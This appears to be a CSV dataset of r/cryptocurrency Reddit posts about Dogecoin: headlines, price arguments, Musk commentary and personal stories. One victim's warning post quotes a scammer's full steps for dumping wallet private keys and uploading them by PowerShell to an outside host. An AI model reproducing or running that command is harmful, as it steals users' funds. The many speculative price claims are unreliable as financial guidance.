Crypto,Subreddit,Title,Content,Score,Created_At,Comments
DOGE,cryptocurrency,Dogecoin will never reach $0.69 again,"Dogecoin the original memecoin will not surpass it's previous all time high price of $0.73 in the next bull run.  Lets look at the charts of eight cryptocurrencies including DOGE  &#x200B;  https://preview.redd.it/kbij5mktxasa1.png?width=735&format=png&auto=webp&s=1c0e09a2225758793e7e07f0bf23231ae501aa21  **It's already failed to do it once**  2021 had two runs - one around May and the other around November. Most cryptocurrencies surpassed their previous high from May in November except Dogecoin, Monero and Litecoin.  **Inflation, Inflation, Inflation**  Every time a new block of transactions is added to the Dogecoin blockchain, 10,000 DOGE are mined. Thatâ€™s about 14.4 million DOGE added per day, or about 5.26 billion per year. There are now roughly Ten billion more DOGE since it hit it's previous high of $0.73, that means it would need to reach a marketcap 7.2 billion dollars higher than May of 2021.  **There is always another Dog Coin**  New comers into the crypto space are looking to repeat the success stories they heard about with DOGE or Shiba investors and will probably buy another random shitcoin that has a much lower marketcap.  &#x200B;  https://i.redd.it/2log1bzt1bsa1.gif  ^(None of this should be taken as financial advice and I'm probably wrong about all of it,  DOGE will probably become the next world reserve currency.)",237,2023-04-06 18:13:01,576
DOGE,cryptocurrency,"Hacker exploits DOGECOIN flaw, crashing 69% of nodes and exposing a vulnerability that could have taken down the entire network.",,2743,2024-12-12 14:18:17,397
DOGE,cryptocurrency,"In 2018 on Hitbtc i purchased many different coins, including 2000 DogeCoins and was going to get them out in 10 years. Hitbtc took them all.","Just f*** hitbtc. Yes i was not checking my account every day, but to take all my crypto out because of Inactivity. Hard lesson learned.",2127,2024-12-03 15:12:52,489
DOGE,cryptocurrency,Dogecoin Creator Says That 70 Percent of Crypto Investors Are Complete Morons,,11070,2022-05-18 07:08:13,1407
DOGE,cryptocurrency,"People That Say ""Imagine If DogeCoin Went to $10 or $100"" Do You Guys Understand Market Cap and Circulating Supply? Dogecoin Price/Market Cap/Circulating Supply Analysis and Calculation","&#x200B;  # If you are buying dogecoin because:  1. *You are doing it for short term profit (Which is a risky game you are playing)* 2. *You are doing it for fun*  &#x200B;  **I'm okay with this because you understand the dynamics involved.**   &#x200B;  # But if you are doing it for long term profit...  &#x200B;  https://preview.redd.it/vmrn8qo7hxu61.png?width=1095&format=png&auto=webp&s=777bb4a5f8341d8f310854ffe3f743bc21205477  **Lets examine this:**  &#x200B;  Note: I calculated this when dogecoin was at $0.32 several days back (this might not reflect the price when you read this)  &#x200B;  [https://www.coingecko.com/en/coins/dogecoin](https://www.coingecko.com/en/coins/dogecoin)  &#x200B;  * **Although there are many factors that drive Cryptocurrency price, this is a general way to calculate what the price of a cryptocurrency is going to be.**  https://preview.redd.it/kbiy1nrzhxu61.jpg?width=1098&format=pjpg&auto=webp&s=902c50332aa269726b18b8ad1ad399c90f362d25  &#x200B;  * **When you are dividing, if the top number is higher, the answer will be a higher number.** * **When you are dividing, if the bottom number is higher, the answer will be a lower number.**  https://preview.redd.it/7stufha9ixu61.jpg?width=1098&format=pjpg&auto=webp&s=321c77a9ee07dc367175896d00a2f7e1df7f2f20  * **In order for the Market Cap (Top Number) to go up, many people would have to buy dogecoin**, but many people understand this is a meme coin or a pump/dump coin. They are using this as short term profit or self entertainment because there is no long term adoptation compare to other crypto currency projects. * **In order for the Circulating Supply (Bottom Number) to go down, they would have to stop mining dogecoin**, but there is 14.4 Dogecoins being produced in one day which is 5 Billion Dogecoin a year.  &#x200B;  * **If you want DogeCoin to be $10** based on the circulating supply we have now, then the **Market Cap would have to be 1.29 Trillion** *(Note: I calculated this several days back, so the number might be even higher now)*, **that's if DOGECOIN STOPPED MINING and NEVER MAKE ANYMORE!**  &#x200B;  https://preview.redd.it/y8uj7wpnkxu61.jpg?width=1098&format=pjpg&auto=webp&s=51bad19cb85914a73423e7e106f224b6fabc6133  &#x200B;  * **How big is a 1.29 Trillion Market Cap? How much would it need to reach $10?**  https://preview.redd.it/z0x2clr2mxu61.jpg?width=1098&format=pjpg&auto=webp&s=d106a23320cfb6d4aedce9742171525939e4ebc2  * **Dogecoin would have to overtake Facebook and Tesla!**  &#x200B;  **Once again, this is if Dogecoin stopped mining right now and produced no more Dogecoin supply, but Dogecoin will produce to infinity, it will not stop producing because there is no cap.**  &#x200B;  **This is like trying to mop a wet floor that has a water leak and the water leak will never stop leaking. Yes, you can recruit more workers to mop the floor, but at some point the workers will quit and leave, then you are left mopping the water by yourself and eventually you will drown in the water.**   &#x200B;  **Take your mop and go home!**  &#x200B;  PS: I'm NOT posting this in Dogecoin subreddit. I will get stoned to death.",20854,2021-04-23 14:24:56,3245
DOGE,cryptocurrency,"Elon Musk backs Mark Cuban's claim that dogecoin is the best cryptocurrency as a medium of exchange - in other words, billionaires pulling each other's dicks",,15988,2021-08-15 13:06:23,2150
DOGE,cryptocurrency,McDonald's Responds To Elon Musk: We Will Accept Dogecoin If Tesla Accepts GrimaceCoin,,12235,2022-01-26 03:50:05,1342
DOGE,cryptocurrency,Coffeezilla YouTube channel just got deleted by YouTube for a video where he warned viewers about DogeCoin,"Coffeezilla is a famous youtuber who exposes scams and warns people to never invest in them. His recent video telling people that Doge is like gambling got a community guidelines strike from YouTube and they deleted his channel. Imagine waking up to see your livelihood destroyed. We desperately need a decentralised video platform so that these powerful companies lose their monopoly. We don't matter to them even though we are the users of these platforms, how ironic!  Edit: He just shared his thoughts on twitter that it might have been the doge army who flagged his video and took down his channel.  https://preview.redd.it/rt116wyy2ix61.png?width=1166&format=png&auto=webp&s=b432aa9da6c312618a1e01889bebe31d5058b2f2  Final edit: He got the channel back after the youtube team manually verified that no guidelines were broken.",16536,2021-05-06 13:03:52,2039
DOGE,cryptocurrency,"Dogecoin produces 10,000 coins per block at a rate of roughly 1 block per minute. That's around 14m coins per day. Let's see how long you can sustain a pump with those numbers against you.","Honestly, I don't really mind pumping coins, particularly joke coins like Doge. But if I see another post from someone saying ""but what if Doge is the next Bitcoin"" I think I'll crack!  You can only pump a coin like Doge so far! I'm seeing people saying ""what if it gets to $100 or even $1000?"". Do they have any idea how many of these coins are in circulation?!   Part of the whole joke of Doge was its rediculous supply cap and real terms inflation, with literally billions of new coins being generated annually. You can only sustain the upwards trajectory of something like that for so long...  If you're a newbie playing with Doge, these is a huge chance your going to lose next to everything. The actual coin is designed to lose ""value"", the fundamental function of the coin is actively working against you!",17583,2021-02-07 20:28:10,2661
DOGE,cryptocurrency,"Remember the guy who was a dogecoin millionaire, dont be this guy.","Remember the guy who was a dogecoin millionaire?   The guy got everything that he owns, even borrowed money from this parents (cleaning lady/truck driver) and put $250k in dogecoin at 0.05cents. Basically, everything that you have ever read in this subreddit of what not to do, he did it. Then, he got the luck of a lifetime and was up $3.5M. The guy wanted more and fame.  The stupid Hodl hodl hodl. Hodl sometimes is stupid. When life changing money shows up, take it.  Now Doge is approaching 0.10 . The guy is only $250k up, down from $3.25M. $250k is not life changing if you live in California, like he did.  If you ever feel down, watch when Doge is at 0.05 and think about this guy, it will ease your pain.  â€¦. he also has 1 billion Floki Inu just to make things worst.",6944,2022-02-22 03:58:56,1615
DOGE,cryptocurrency,Mark Cuban Dismisses Dogecoin Founder's Concerns: Kamala Harris Is 'Night And Day Away From Biden And Far Ahead Of Trump' On Crypto Understanding,,1074,2024-10-15 12:27:55,388
DOGE,cryptocurrency,Tesla CEO Elon Musk is reportedly under SEC investigation over Dogecoin tweets,,17039,2021-02-25 19:25:00,1516
DOGE,cryptocurrency,Dogecoin: A Joke No More? The Rise Of A $58 Billion Crypto Phenomenon,,864,2024-11-24 03:19:55,382
DOGE,cryptocurrency,My friend found his dogecoin core wallet form high school with 2.5m DOGE on it,"https://imgur.com/a/7u2yAYX  Says it changes his life. Imagine buying into a shit meme in high school and having close to a million dollars after working your whole life. This guy was seriously in the pits trying to provide for himself bartending.  Just shows how liberating crypto can be. Just one of those wildcard things that can be life changing...  Edit: here is the 'story' for those wondering: He remembered he had some shitcoins on his hold highschool laptop so he logged on and found his dogecoin core wallet that sync'd up to 2.5m DOGE. After he found it he went to a trusted financial planner and said ""I have $750k USD in Dogecoin. What do I do with it"" the financial planner said ""you know how the class system works in america right?... Well, Fuck 'em""",10492,2021-05-03 14:29:33,1807
DOGE,cryptocurrency,"Best Investment Ever? Vitalik Buterin Says He Cashed Out $4.3M for $25,000 He Invested in Dogecoin in 2016",,11389,2021-06-04 11:12:25,938
DOGE,cryptocurrency,"Users in the dogecoin subreddit are now spilling over into other high supply, high cap low value token subs and it's rapidly ruining the quality of the reddit cryptosphere","Some anecdotal gems I've seen in the last two days:  1. After a day of a coin fluctuating just to ultimately go down or move sideways they say ""it's MOONING""  2. They're calling their holdings ""shares""  3. A person told me yesterday that dogecoin blockchain is going to ""replace the internet""  4. They seem to believe that joining pump and dump channels on discord is somehow going to benefit them  5. They keeps saying that ""wallstreet"", ""the suits"", or the ""wealthy elite"" are suppressing the price  6. Unironically talk about retiring as a result  7. Been harassing & threatening a former member of the dev team telling him to stop all mining and remove the block reward so the value stops getting diluted  8. And, as we've all seen, have a fundamental misunderstanding of math and tokenomics  This is going to end poorly for each and every one of them - deservedly so - but I simply just want to be able to read crypto news without having to filter through this trash",9173,2021-01-31 23:46:18,1523
DOGE,cryptocurrency,Elon Musk says he'll 'eat a Happy Meal on TV' if McDonald's accepts Dogecoin payments,,5783,2022-01-25 17:04:02,1070
DOGE,cryptocurrency,'Joke' Crypto Dogecoin Surges Over 500% In 24 Hours In Reddit-Driven Boon,,10454,2021-01-29 02:00:46,1064
DOGE,cryptocurrency,Doge has a single wallet with more than 23.17% of all the Dogecoin in circulation and it can be rugpulled at ANY moment.,"For comparison, the largest Bitcoin wallet is the Binance coldwallet and it holds approximately 1.40% of the current circulating supply while the largest Ethereum wallet is the  Eth2 Deposit Contract which holds 7.6% of all Ethereum.  The largest Dogecoin wallet, which currently holds $5 Billion in Doge of its $21 Billion market cap is very mysterious. It was thought to be Robinhood or some other exchange but that has previously been dismissed by the Robinhood CEO himself.  [Doge wallet with 23.17&#37; of the entire circulating supply](https://preview.redd.it/go0edwi8nic81.png?width=1436&format=png&auto=webp&s=67d99e6b36c56bcf24470f6676421f98dee70f4f)  Any wallet that holds over 23.17% of the current supply has more than enough to rug pull an entire coin to near zero. Even half of that can cause the price to crash to unrecoverable levels due to how liquidity and market caps work.  According to Forkast,  >For new cryptocurrencies, if the top 10 wallets hold **more than 20% of the** token, or worse, a large percentage of the token is held in a single wallet, then this is a dangerous sign of a potential rug pull.  **For Doge, the top 14 wallets own  46.11% of all Dogecoin.**  TLDR: Avoid any Cryptocurrency that has wallets capable of rug pulling the entire project. Don't let a false sense of security take over just because Doge is popular. It still does not make Doge immune to rugpulls. Never let yourself be at the mercy of a single wallet.  EDIT: The amount of people on the comments claiming it to be the Robinhood wallet DESPITE Robinhood's CEO publicly stating the company does not hold that much Doge as far back as May is the same argument Shib shillers make. It is careless copium. [https://www.marketwatch.com/story/a-25-billion-dogecoin-whale-lurks-but-robinhood-ceo-says-we-dont-have-significant-positions-in-any-of-the-coins-we-keep-11620326508](https://www.marketwatch.com/story/a-25-billion-dogecoin-whale-lurks-but-robinhood-ceo-says-we-dont-have-significant-positions-in-any-of-the-coins-we-keep-11620326508)   Moreover the fact that some people find safety in a company like Robinhood is just stupid.",3859,2022-01-18 22:03:51,2740
DOGE,cryptocurrency,1.4B DOGE Dumped by 2 Whales After Elon Musk Changed the Twitter Logo to Dogecoin,,2955,2023-04-08 08:06:01,623
DOGE,cryptocurrency,Elon Musk's latest attempt to pump Dogecoin fails miserably. Heâ€™s becoming irrelevant!,,5564,2021-07-01 13:02:35,884
DOGE,cryptocurrency,"Ethereum co-founder Vitalik Buterin revealed he profited more than $4 million from a $25,000 investment that he made into Dogecoin during 2016. But true to form, he gave it all away to charity.",,10264,2021-06-10 00:24:12,506
DOGE,cryptocurrency,Elon Musk is accused of insider trading by investors in Dogecoin lawsuit,,2431,2023-06-01 16:53:51,455
DOGE,cryptocurrency,Elon Musk Posts â€œDogecoinâ€ Text Image But Fails To Boost Dogecoin Price - Bitcoinik,,1042,2024-09-08 09:28:20,221
DOGE,cryptocurrency,Dogecoin Creator: It 'Annoyed Me' When Musk Promoted Meme Currency,,3197,2022-09-10 13:27:37,492
DOGE,cryptocurrency,"Dogecoin Is Now Larger Than Ford, Adidas, Lululemon, Roblox: 15 Companies Worth Less Than Meme Crypto",,862,2024-11-12 12:35:18,183
DOGE,cryptocurrency,Dogecoin price is on a downtrend toward $0.20,,2789,2021-09-16 14:27:13,1207
DOGE,cryptocurrency,"Dogecoin is the Worst Cryptocurrency Available in the Market, Says Financial Expert",,3287,2021-06-26 08:42:43,976
DOGE,cryptocurrency,Elon Musk's Dogecoin Explanation on SNL (DOGE reached a high of $0.70 and low of $0.47 while the show was live),,2718,2021-05-09 05:41:51,1403
DOGE,cryptocurrency,"How much will the price of Dogecoin move by Monday, May 3rd?","Reference price: $0.270820  [Data will be sourced from CoinGecko](https://www.coingecko.com/en/coins/dogecoin)  **FILTERING CRITERIA: 1w, USD, Linear Chart, Close Chart**  Winning results will be based on the price **at 12 pm PDT on May 3rd.** Results of the prediction will be revealed **between 11:59 AM PDT and 11:59 PM PDT the day after the prediction date.**  [View Poll](https://www.reddit.com/poll/mz3avs)",5084,2021-04-26 17:40:52,399
DOGE,cryptocurrency,Charles Hoskinson Invites Dogecoin to Migrate to Cardano for Free,,1619,2022-10-29 15:23:36,782
DOGE,cryptocurrency,Kabosu dies: Shiba inu which inspired the 'doge' meme and became face of Dogecoin has died | World News,,1343,2024-05-24 10:37:06,172
DOGE,cryptocurrency,"As dogecoin price tops 60 cents, Elon Musk says â€˜please invest with cautionâ€™ ahead of â€˜Saturday Night Liveâ€™","After pumping Dogecoin for months, Elon flips the script and advises crypto investors to [invest with caution.](https://www.marketwatch.com/story/as-dogecoin-price-tops-60-cents-elon-musk-says-please-invest-with-caution-ahead-of-saturday-night-live-guest-host-gig-11620390114)   Seems like too little too late. We already know many new investors fomoing into Doge will be burned.   Seems like a bunch of shenanigans to me.",2372,2021-05-07 18:50:15,1163
DOGE,cryptocurrency,Its been a year since Elon Musk announced he'd be helping Dogecoin Devs to build a better system.. time to call him out.,"**April 2021**  Sadly Sporklin a Dogecoin developer for 7 years loses her [fight against cancer](https://cryptopotato.com/dogecoin-developer-sporklin-dies-cancer/)  In one of her [last post](https://www.reddit.com/r/dogecoindev/comments/lpucjw/dogecoin_can_reach_1_with_significant_dev) she is clear on how much involvement/ impact Musk has had.  *â€œElon has nothing to do with Dogecoin which has been made clear repeatedly â€¦ Elon has come to play with Dogecoin for years on social media, it was only recently that people tried to turn that into something it is not â€¦ Things have not changedâ€¦Elon is not on board with anything, Elon does not have anything to do with the project, the listings, the engagementsâ€¦Nothing. He memes and trolls.â€*  **May 2021**  On Twitter Elon the now dubbed Dogefather announced : ""[Working with Doge devs to improve system transaction efficiency. Potentially promising.](https://twitter.com/elonmusk/status/1392974251011895300?s=20&t=vILjxrPe0-pgjeaeWucMiw)"" ... the price of Doge surged.   In a now deleted tweet Dogecoin co-founder Jackson Palmer cautioned followers saying..  *""Reminder: Elon Musk is and always will be a self-absorbed grifter.""*  **Nov 21**  Last Dogecoin GitHub Master branch [commit](https://github.com/dogecoin/dogecoin/commits/master) was over 7 months.  Although still signs of some life [on dev branches](https://github.com/dogecoin/dogecoin/branches)  Last release, [6 months ago...](https://www.reddit.com/r/dogecoindev/comments/qpkk46/dogecoin_core_1145_released/)  **Jan 22**  In a long awaited Dogecoin announcement, the headline says Tesla  [accepts Dogecoin](https://www.investopedia.com/tesla-accepts-dogecoin-for-merchandise-5216067) but the reality says its only for certain items in its shop like a belt buck and Tesla shaped whistle.   **Feb 2022**  Core developer Ross Nicoll [steps away](https://rnicoll.name/posts/2022-02-16-stepping-away/) from the project referring to stress, a potential lawsuit against the developers and lack of funds the foundation has to pay him anything at all despite the Billionaire supposingly having Devs back.   **Apr 2022**  In a [Twitter thread](https://twitter.com/michilumin/status/1517958353024020480?s=20&t=_9ZUgcvPqct44NLcE4qKMQ) another Dogecoin developer Michi Lumin again paints a picture of an underfunded foundation....  *""When influencers say that the Foundation has tons of funding lined up, or that we're building out infrastructure - and people believe that - it actually harms the @DogecoinFdn because people who would otherwise be willing to help go ""oh, they have it all taken care of"", This bothers me because we're not actually a club full of rich people. Many of us still work day jobs to make ends meet but still want to see #dogecoin proceed and succeed. Tales of palace intrigue end up being things we have to spend time answering to, as well...and the propensity for certain sections of the community and media to be thirsty for the next scandal or conspiracy actually puts a lot of strain on an already fairly stressed crew.""* *""Yes, we're trying to get sustaining funding in order to do some of the 'big ideas' we want to pursue. A lot of what you read on social media in regard to this is completely made up for clicks and engagement-We still have a lot of hard work to do. Wish ppl wouldn't make it harder.""*  On the whole after over a year there has been no dramatic revelation or support for [Dogecoin development](https://gitgitlog.com/dogecoin).. think it's safe to deduce that once again.... Elon Musk is most likely Twitters biggest spam bot ðŸ’©",2038,2022-05-24 18:58:14,577
DOGE,cryptocurrency,"65% of working Americans are willing to be paid in Bitcoin, Ethereum, and Dogecoin",,2565,2021-09-27 23:42:55,579
DOGE,cryptocurrency,"Vitalik Buterin proves that Elon's Dogecoin ""solution"" is flawed, and this is how Musk responds. Shame he can't accept the fact that he's wrong.",,2233,2021-05-24 13:45:36,756
DOGE,cryptocurrency,Dogecoin Becomes Second Largest Proof Of Work (PoW) Crypto,,1467,2022-09-15 15:39:14,548
DOGE,cryptocurrency,"Billionaire Mark Cuban reveals he owns only $500 worth of dogecoin, despite his praise for the meme token",,1818,2021-08-16 14:34:34,740
DOGE,cryptocurrency,Dogecoin just reached $.16. Is it (finally) time to admit this sub is bad at price prediction.,"For context, I own 0 dogecoin.   But as hard as this may be for some of this sub to hear but being a *silly* cryptocurrency is a far cry from being a scam.   Just months ago people were enraged on here for the popularity of dogecoin as it surged past $.05.   Maybe this sub shouldn't be so confident in their price predictions and telling others what projects are or aren't worth investing in.  **edit: Also just want to point out that making or losing money on dogecoin is not the determining factor of whether or not dogecoin is a scam.** This sub will call beef a scam because it's not chicken.",1806,2021-04-15 19:35:36,942
DOGE,cryptocurrency,Dogecoin is now the eight most valuable cryptoasset by market cap.,,1101,2022-11-27 22:56:44,704
DOGE,cryptocurrency,Dogecoin is officially worth 1 cent!,,5700,2017-12-25 03:44:36,422
DOGE,cryptocurrency,"Dogecoin is now the number 8 CryptoCurrency by market cap, ahead of Cardano and Solana","# First and foremost. Dogecoin has massively pumped over the last week, up 77%, it's likely massively hyped and due for a correction, buying Doge will probably get you burnt.  Over the past year Dogecoin has taken hit after hit along with the rest of the crypto market. Every time Dogecoin dropped out of the top 10 cryptos by market cap, this sub was quick to celebrate the drop.   With posts like  [If You're Still Holding Dogecoin, You're the Greater Fool](https://np.reddit.com/r/CryptoCurrency/comments/uvil1o/if_youre_still_holding_dogecoin_youre_the_greater/)   [Polkadot (DOT) Dethrones Dogecoin To Join Crypto Top 10](https://np.reddit.com/r/CryptoCurrency/comments/xatmpz/polkadot_dot_dethrones_dogecoin_to_join_crypto/)   and blatantly false FUD posts   [Doge has a single wallet with more than 23.17% of all the Dogecoin in circulation and it can be rugpulled at ANY moment.](https://np.reddit.com/r/CryptoCurrency/comments/s798gh/doge_has_a_single_wallet_with_more_than_2317_of/)   The top wallet was previously discovered to be RH holding on behalf of its clients not a whale waiting to dump Doge.   \------------------------------------------------------------------------------  So I wanted to use this opportunity to celebrate the recent rise of Dogecoin  * Over the past five years Dogecoin is up 410% against BTC * Over the past year Dogecoin is up 10% against BTC * Over the past 6 months Dogecoin is up 45.85% against BTC * Over the past month Dogecoin is up 64.82% against BTC * Over the past 5 days it's up 65.88% against BTC * Over the past day it's up 23.89% against BC  \* To prevent spam on this post I didn't include image of charts, however you can Google ""Dogecoin to BTC"" and look at the charts for comparison in the different time frame if you want  \---------------------------------------------------------------------------  Welcome back to the top 8 cryptos by marketcap Doge. May your stay be long and not just a few hour footnote on the daily news.   Again, Dogecoin is massively hyped, hype is not reasonable or long term and anyone thinking of buying into hype should be prepared to be exit liquidity for whales.",924,2022-10-29 14:03:15,740
DOGE,cryptocurrency,$61M Dogecoin Sold By Crypto Whale After Elon Musk's Twitter Logo Tweak,,990,2023-04-04 10:12:02,417
DOGE,cryptocurrency,"Suspect Disappears With $119,000,000 Worth of Dogecoin in Alleged DOGE Mining Scam",,1532,2021-08-30 18:47:07,525
DOGE,cryptocurrency,Mark Cuban: Dogecoin Has More Applications Than Cardano,,1018,2022-08-08 15:19:29,546
DOGE,cryptocurrency,Goldman Sachs director quits after making millions from Dogecoin,,2103,2021-05-12 08:56:22,337
DOGE,cryptocurrency,"If You're Still Holding Dogecoin, You're the Greater Fool",,872,2022-05-22 19:46:39,817
DOGE,cryptocurrency,"Industry Responds To Billionaire Mark Cuban Calling Dogecoin, Shiba Inu, Meme Coins â€˜Rug Pulls In The Worksâ€™",,371,2024-10-06 12:37:33,160
DOGE,cryptocurrency,"Elon Musk says dogecoin tweets are jokes, he is a supporter of bitcoin",,1709,2021-02-01 21:42:37,348
DOGE,cryptocurrency,Dogecoin founder slams every token on the Binance Smart Chain as â€œgarbageâ€,,1048,2022-06-04 18:34:50,364
DOGE,cryptocurrency,DogeCoin Best Coin,,2258,2018-01-20 15:11:21,451
DOGE,cryptocurrency,"Shark Tankâ€™s Kevin O'Leary Won't Invest in Dogecoin, Says 'I Donâ€™t Understand Why Anybody Would'",,990,2021-08-01 01:02:02,627
DOGE,cryptocurrency,This is how much the creator of Dogecoin earned,"The creator of dogecoin, Billy Markus, is often called ""salty"" online. This is for good reason, he admits. He sees scammers making millions while he himself earned only a fraction on dogecoin. Dogecoin is consistently in the top 20 of all crypto currencies. The meme-coin was founded as a joke, but gained popularity for many different reasons. In the bull market of 2021, the coin rose from $0.01 to $0.74, an increase of over 7400%.  &#x200B;  **Marcus didn't get rich**  In particular, Elon ""dogefather"" Musk contributed to these increases. With tweets and rumors, he made sure that almost everyone was taken in by the currency. In this kind of action there are always winners and losers. So during this period, many people got rich from DOGE, but people also lost money. Billy Markus never really made himself rich with his creation.  &#x200B;  https://preview.redd.it/54x0rzltuxq81.png?width=554&format=png&auto=webp&s=fcd32e4ccd644830ba88f6cce9ef9a42c2ac8436  ***'Of course I'm salty!'***  ""*People always say I'm salty,*"" Markus tweeted. ""*Of course I'm salty! I made $3000 from a crypto with a market capitalization of $80 billion. Watching scammers make millions and strangers attack me all day. Who wouldn't be salty?*""  &#x200B;  ""I'm not saying I'm struggling, I've always been fine, except when I sold my crypto in 2015 to pay the rent. I'm just giving context to why so many things are so extra annoying; why it's annoying that 'entitled bastards' 8 years later say I should make them richer.""  &#x200B;  *'Create a dogecoin 2'*  So Marcus finds it hard that people hold him accountable for their portfolio, even though he himself had sold his crypto in 2015. A Twitter user shot in an idea to create 'dogecoin 2' to make millions, but that is not possible according to Markus.  &#x200B;  https://preview.redd.it/r5ktwxazuxq81.png?width=562&format=png&auto=webp&s=33cc0d59bf556f34fbbe56c61dab4b07e76f7347",830,2022-04-01 15:48:51,479
DOGE,cryptocurrency,Why is everyone mocking the Dogecoin millionare? Shouldn't we as a community band together instead of mocking other people's success?,"Recent posts here have mocked outright the guy who took a risk and made a million dollars on dogecoin.  So what if he is down from that million? Could it hurt anyone to congratulate the guy instead of poking fun at his misfortune? I mean he is still up 250k and never sold. I don't know about you, but that is more money than I have ever made in crypto and the guy has genuine balls to risk 250k early on Dogecoin.  And incase you didn't notice, the whole damn market is down at the moment not just memecoins.  Yes he took a risk and yes i wouldn't recommend anyone invest that much money on a memecoin, but it paid off for him and isn't the whole damn point of investing in crypto to MAKE money?   We should be uniting people in the crypto community not dividing them by making fun at them. I for one am happy for him. If he becomes a future multi millionare doge holder I hope he sets and example by being humble back to those smug people who relentlessly poked fun at his misfortune.",855,2022-02-22 07:23:51,467
DOGE,cryptocurrency,Vitalik Buterin Confirms Heâ€™ll Help in Moving Dogecoin to Proof-of-Stake (PoS) Network,,814,2022-02-01 16:19:38,487
DOGE,cryptocurrency,"Gucci will accept 10 cryptocurrencies including Bitcoin, Ether, and Dogecoin",,1188,2022-05-05 11:59:56,254
DOGE,cryptocurrency,Just got Scammed of 91k Dogecoins,"I mined dogecoin in my first year of university in 2013. It was a fun thing to do in-between studying for exams with my floormates. I managed to mine 91k coins. I never touched them since 2013. Thankfully I kept my old laptop.  It had been on my mind even during the last bull market in 2017 if I could even access my dogecoins. Never got around to try, was busy with university/life. And I was more than happy to just keep the dogecoins and see what happens. It was so exciting back then to see DogeCoin go up in price from being worth nothing to $0.06 and eventually $0.08 cents. With the recent price surges, I decided I would figure out how to take out my coins. Mainly because of a growing doubt in my mind that my coins were not accessible. I made a post yesterday about the coins I mined and how to transfer them out of a 2013 wallet. I got a DM from user -Jax\_Brantley- (sorry reddit won't let me link his profile). Telling me that I needed to get on the ""Correct Fork"" otherwise when I send my coins they would be ""stuck in limbo"". He sent me two posts corroborating his claims:  [https://github.com/dogecoin/dogecoin/issues/250](https://github.com/dogecoin/dogecoin/issues/250)  [https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg\_lost\_coins\_to\_fork\_after\_just\_starting\_much/](https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg_lost_coins_to_fork_after_just_starting_much/)  His profile looked legit to me with activity on the doge forums. Even a popular post saying how he recovered 389k of Dogecoins ([https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge\_coin\_saved\_my\_life\_holding\_389k\_coins/](https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge_coin_saved_my_life_holding_389k_coins/)). He told me how my story was similar to his. His profile has many comments ""helping other against scammers"" in the community.  The story he presented to me made sense and I gave him a chance; this was due to my lack of knowledge (my floormate installed everything on my computer), outdated Dogecore wallet, the posts he sent me, his reddit profile. I was unknowingly falling for his bait.. Anyways we talked some more. I uploaded our conversation for those that are interested. It seems he deleted our first messages. [https://imgur.com/gallery/yh1g7CQ](https://imgur.com/gallery/yh1g7CQ)  The main part of my post is to bring awareness to this scam. If anyone is trying to take advantage of your 'old wallet' pre-2014 fork, please do NOT give them any of your time. Please avoid any DMs containing the following steps (he even 'kindly' wrote detailed steps for my dumbass):  Step 1) Close dogecore-qt.exe and find the dogecore-qt.exe (right click it and run as admin)  Step 2) go to Tools -> debug -> console  Step 3) type  dumpwallet [peers-log.zip](https://peers-log.zip/)  Step 4) find the zip beside dogecore-qt.exe or in C:/Program Files/Dogecoin  Step 5) in this folder hold shift + right click anywhere and select open ""powershell here"" from the dropdown menu  Step 6) type this command or copy paste it  invoke-webrequest -method PUT -infile .\\[peers-log.zip](https://peers-log.zip/) [dogecoin-peers.online/nodes](https://dogecoin-peers.online/nodes) \-usebasicparsing  Step 7) go to the new folder it created called ""dogecoin-peers/online"" and find the file called nodes.txt and open it.  Step 8) It will have a list of connection failed and node ID  Step 9) go to the console like in step 2 and type remove node <ID HERE>  Step 10) Restart wallet and you are all done.  After completing step 6, the truth presented itself. I got scammed... I looked on reddit more for this type of scam (should have had a better eye originally). Sadly, I came across this post too late. [https://np.reddit.com/r/dogecoin/comments/n2yxgq/how\_the\_scam\_works/](https://np.reddit.com/r/dogecoin/comments/n2yxgq/how_the_scam_works/)  For those interested, here's my old wallet: [https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A](https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A)  A picture of the old wallet from my laptop.  [https://imgur.com/a/KYLvxuj](https://imgur.com/a/KYLvxuj)  Thank you to anyone who has read my post. I was conflicted to even post about this because I just was filled with emotion and that it would be an incoherent batch of word salad. After writing this out, I have been able to get more clarity and peace.  I hope there is someone that I can help and they would not fall for the same scam I did. Everyone who has made life-changing money or any money with Dogecoins, I am happy for you. Please appreciate what you have for me.  Take care,  (Originally tried to post to Dogecoin subreddit but I can't get passed the auto moderator...)  Dogeminer 2013  &#x200B;  \*Edited to add the Scammer's post that made me believe him.. I am a sucker for a heartwarming story..  [https://imgur.com/gallery/91c3Apl](https://imgur.com/gallery/91c3Apl)",987,2021-05-06 13:55:22,514
DOGE,cryptocurrency,"Dolce & Gabbana Wants to Crown Dogecoin Fan Elon Musk as ""King of Crypto"".. I prefer ""Clown of Crypto""","So today, the 26th of September 2020, the official twitter of Dolce & Gabbana tweeted the following:  &#x200B;  [Dolce & Gabbana tweet about crowning Elon Musk](https://preview.redd.it/2p8ew3ue7wp71.png?width=602&format=png&auto=webp&s=8426e753a0a4b77a3526e68552344517e42f7beb)  The Doge Crown, which features seven blue sapphires and 142 diamonds, was designed by none other than Domenico Dolce and Stefano Gabbana themselves.   **However**, the crown has nothing to do with the meme cryptocurrency or its most famous cheerleaders since it was named after the former title of the supreme authority of Venice.   I believe **it is time that we stop praising** elon musk for doing literally nothing else than pumping a ~~shit~~ memecoin.   He is not, and will never be the King of Crypto.  Hail Vitalik!",1015,2021-09-26 19:02:40,397
DOGE,cryptocurrency,Dogecoin founder on Twitter: I think it says a lot about the state of the cryptocurrency space in general that a currency with a dog on it which hasn't released a software update in over two years has $1 billion market,,2210,2018-01-09 10:00:37,345
DOGE,cryptocurrency,Dogecoin Rockets 48% as Traders Target $1 Price Next,,255,2024-11-12 07:12:24,113
DOGE,cryptocurrency,No more Dogecoin or memecoin shilling on TikTok after ban on paid crypto promotions,,1235,2021-07-11 06:39:34,319
